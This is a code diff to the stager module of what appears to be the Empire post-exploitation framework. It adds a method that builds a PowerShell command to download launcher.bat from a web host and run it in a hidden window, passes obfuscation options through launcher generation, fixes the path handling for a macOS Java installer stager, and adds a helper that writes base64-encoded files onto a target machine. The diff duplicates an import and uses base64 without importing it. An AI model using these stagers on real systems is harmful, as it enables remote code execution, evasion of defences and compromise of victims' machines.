@@ -17,7 +17,9 @@ The Stagers() class in instantiated in ./empire.py by the main menu and includes
 import fnmatch
 import imp
 import helpers
+import errno
 import os
+import errno
 import macholib.MachO
 import shutil
 import zipfile
@@ -75,8 +77,16 @@ class Stagers:
                 if stagerOption == option:
                     stager.options[option]['Value'] = str(value)
 
+    def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
+        #TODO add handle for other than powershell language
+        stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+        if encode:
+            return helpers.powershell_launcher(stager, launcher)
+        else:
+            return stager
 
-    def generate_launcher(self, listenerName, language=None, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
+
+    def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
         """
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
         if it exists.
@@ -88,7 +98,7 @@ class Stagers:
 
         activeListener = self.mainMenu.listeners.activeListeners[listenerName]
 
-        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
+        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
         
         if launcherCode:
             return launcherCode
@@ -435,7 +445,16 @@ class Stagers:
         javacode = file.read()
         file.close()
         javacode = javacode.replace("LAUNCHER",launcherCode)
-        file = open(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java','w')
+        jarpath = self.mainMenu.installPath+'data/misc/classes/com/installer/apple/'
+        try:
+            os.makedirs(jarpath)
+        except OSError as e:
+            if e.errno != errno.EEXIST:
+                raise
+            else:
+                pass
+        
+        file = open(jarpath+'Run.java','w')
         file.write(javacode)
         file.close()
         currdir = os.getcwd()
@@ -451,3 +470,19 @@ class Stagers:
         os.remove('Run.jar')
 
         return jar 
+
+
+    def generate_upload(self, file, path):
+        script = """
+$b64 = "BASE64_BLOB_GOES_HERE"
+$filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
+[IO.FILE]::WriteAllBytes($filename, [Convert]::FromBase64String($b64))
+
+"""
+
+        file_encoded = base64.b64encode(file)
+
+        script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
+        script = script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
+
+        return script
